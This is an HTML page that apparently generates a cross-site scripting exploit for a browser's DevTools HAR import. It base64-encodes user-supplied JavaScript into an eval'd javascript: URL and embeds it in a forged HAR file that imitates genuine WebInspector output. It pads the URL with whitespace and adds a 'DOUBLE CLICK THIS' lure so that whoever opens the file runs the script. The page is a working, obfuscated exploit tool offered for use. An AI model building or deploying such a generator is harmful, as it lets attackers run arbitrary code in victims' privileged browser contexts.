<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Devtools .har XSS Generator</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 40px;
      background-color: black;
      color: white;
    }
    textarea {
      width: 100%;
      max-width: 800px;
      margin-bottom: 10px;
      outline: 2px solid white;
      background-color: black;
      color: white;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>Devtools .har XSS Generator</h1>
  <p>XSS found by crossjbly, site by Blobby Boi. IF ANYONE ELSE CLAIMS THEY MADE THIS SITE, THEY DIDN'T!!!!</p>
  <p>Please refer to the <a href='https://github.com/crossjbly/HarTools/blob/main/README.md'>Readme.md</a> File on our GitHub repo.</p>

  <textarea id="jsInput" placeholder="Enter JavaScript code here" rows="10" cols="80"></textarea><br>
  <button onclick="generateHar()">Generate .har file</button>

  <script>
  function generateHar() {
    const inputCode = document.getElementById('jsInput').value.trim();
    if (!inputCode) {
      alert('Bro didnt type any code');
      return;
    }

    const now = new Date();
    const nowISOString = now.toISOString();
    const base64Code = btoa(inputCode);

    const bookmarkletUrl = `javascript: (function() {eval(atob(\"${base64Code}\"))})()`;

    const har = {
      log: {
        version: "1.2",
        creator: {
          name: "WebInspector",
          version: "537.36"
        },
        pages: [
          {
            startedDateTime: nowISOString,
            id: "page_1",
            title: bookmarkletUrl,
            pageTimings: {
              onContentLoad: 57.19,
              onLoad: 57.77
            }
          }
        ],
        entries: [
          {
            _connectionId: "16771",
            _initiator: {
              type: "script",
              stack: {
                callFrames: [
                  {
                    functionName: "",
                    scriptId: "9",
                    url: "",
                    lineNumber: 11,
                    columnNumber: 4
                  }
                ]
              }
            },
            _priority: "High",
            _resourceType: "fetch",
            cache: {},
            connection: "443",
            pageref: "page_1",
            request: {
              method: "GET",
              url: bookmarkletUrl + '//' + ' '.repeat(20) + 'DOUBLE CLICK THIS',
              httpVersion: "h3",
              headers: [
                { name: ":authority", value: "" },
                { name: ":method", value: "GET" },
                { name: ":path", value: bookmarkletUrl },
                { name: ":scheme", value: "javascript" },
                { name: "accept", value: "*/*" },
                { name: "user-agent", value: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" }
              ],
              queryString: [],
              cookies: [],
              headersSize: -1,
              bodySize: 0
            },
            response: {
              status: 200,
              statusText: "",
              httpVersion: "h3",
              headers: [
                { name: "content-type", value: "application/javascript; charset=utf-8" }
              ],
              cookies: [],
              content: {
                size: inputCode.length,
                mimeType: "application/javascript",
                text: inputCode
              },
              redirectURL: "",
              headersSize: -1,
              bodySize: -1
            },
            serverIPAddress: "0.0.0.0",
            startedDateTime: nowISOString,
            time: 100,
            timings: {
              blocked: 0,
              dns: 0,
              ssl: 0,
              connect: 0,
              send: 0,
              wait: 50,
              receive: 50,
              _blocked_queueing: 0
            }
          }
        ]
      }
    };

    const blob = new Blob([JSON.stringify(har, null, 2)], { type: "application/json" });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const year = now.getFullYear();
    const unixTimestamp = Math.floor(now.getTime() / 1000);
    const formatted_file_name = `${month}${day}${year}_${unixTimestamp}`;
    console.log("FormattedfileName" + formatted_file_name);
    a.download = "HarTools-" + formatted_file_name + '-script.har';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }
  </script>
</body>
</html>
